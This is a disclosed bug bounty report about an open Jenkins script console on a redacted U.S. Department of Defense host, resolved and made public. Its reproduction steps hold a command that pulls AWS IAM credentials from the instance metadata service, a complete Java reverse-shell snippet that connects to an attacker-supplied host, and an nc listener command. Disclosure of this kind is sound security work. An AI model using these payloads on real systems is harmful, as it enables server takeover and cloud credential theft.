---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/cloud
  - stack/aws
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2024-12-18
submitted: 2023-07-25T16:03:06.525Z
bounty_usd: null
votes: 114
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "shuvam321"
source: "https://hackerone.com/reports/2083771"
title: " Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/"
---
#  Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 114 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-12-18

- Report: [https://hackerone.com/reports/2083771](https://hackerone.com/reports/2083771)
- CWE: Command Injection - Generic
- Submitted: 2023-07-25T16:03:06.525Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**
The host https://██████/ has /jenkins/script directory enabled that allows user to execute system command in the host.


## References
https://hackerone.com/reports/768266

## Impact

Attacker can use the IAM credentials to manage various AWS resources, create and delete resources, read and write data in AWS services,  create and manage other IAM users and roles, access the AWS Management Console, use the AWS Command Line Interface (CLI). In addition, attacker can obtain a reverse shell and takeover the vulnerable server.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to https://███/jenkins/script and enter the following command and click on run. 

println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup".execute().text

```
{
  "Code" : "Success",
  "LastUpdated" : "2023-07-25T15:06:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "[REDACTED - see source report]",
  "SecretAccessKey" : "[REDACTED - see source report]",
  "Token" : "[REDACTED AWS session token]",
  "Expiration" : "2023-07-25T21:32:22Z"
}
```

2. IAM Credentials will be disclosed.

3. To get a reverse shell use this command.

## In vulnerable host

```
String host="your_server_ip";
int port=1337;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## In your host 
```
nc -nvlp 1337
```

4. You will receive a reverse shell as user jenkins.


██████

## Suggested Mitigation/Remediation Actions
Restrict access to /jenkins/script directory.

## Timeline

- **Report Filed**
- **2023-07-25** @shuvam321: Dear team,

I just noticed the music I was listening was also attached along with video. I am sorry about it.

Kind regards,
@shuvam321
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
